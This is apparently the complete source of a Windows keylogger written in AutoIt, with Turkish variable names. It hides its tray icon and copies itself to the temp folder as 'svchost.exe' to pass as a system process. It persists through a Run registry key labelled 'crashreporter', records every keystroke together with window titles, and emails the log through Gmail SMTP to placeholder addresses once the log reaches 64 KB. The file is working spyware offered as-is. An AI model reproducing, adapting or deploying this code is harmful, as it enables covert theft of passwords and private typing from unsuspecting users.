#NoTrayIcon
if @compiled then
if RegRead ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "crashreporter" )=="" then
   FileCopy(@scriptfullpath,@TempDir&"\svchost.exe")
   RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run","crashreporter","REG_SZ",@TempDir&"\svchost.exe")
EndIf
endif
$pencere=""
;loggonder()
HotKeySet("+!K","cikis")
HotKeySet("{ENTER}","enterlog")
for $i=0 to 65535
HotKeySet(ChrW($i),"logkaydet")
Next
While 1
WEnd
func logkaydet()
   if WinGetTitle("")==$pencere Then

   Else
	  FileWrite(@TempDir&"\log.txt",@CRLF&"[[[[["&WinGetTitle("")&"]]]]]"&@CRLF)
	  $pencere=WinGetTitle("")
   EndIf
   if FileGetSize(@TempDir&"\log.txt")>64*1024 Then
	  loggonder()
   endif
   $key=@HotKeyPressed
   FileWrite(@TempDir&"\log.txt",$key)
   HotKeySet(@hotkeypressed)
   Send($key)
   HotKeySet(@hotkeypressed,"logkaydet")
   sleep(1)
EndFunc
func enterlog()
	$key=@HotKeyPressed
   FileWrite(@TempDir&"\log.txt","")
   HotKeySet(@hotkeypressed)
      HotKeySet(@hotkeypressed,"logkaydet")
  Send($key)
   sleep(1)
endfunc
Func cikis()
for $i=0 to 65535
HotKeySet(ChrW($i))
Next
Exit
endfunc
func loggonder()
Local $SW = "smtp.gmail.com"
Local $kimden = "KGL"
Local $kimdenmail = "gönderecekolan@mail.com"
Local $kimemail = "alacakolan@mail.com"
Local $konu = "KGLLOG"
Local $icerik[1]
$icerik[0] = FileRead(@TempDir&"\log.txt")
Local $iResponse = _INetSmtpMail($SW, $kimden, $kimdenmail, $kimemail, $konu, $icerik)
Local $iErr = @error
EndFunc
FileDelete(@TempDir&"\log.txt")
OnAutoItExitRegister ( "cikis" )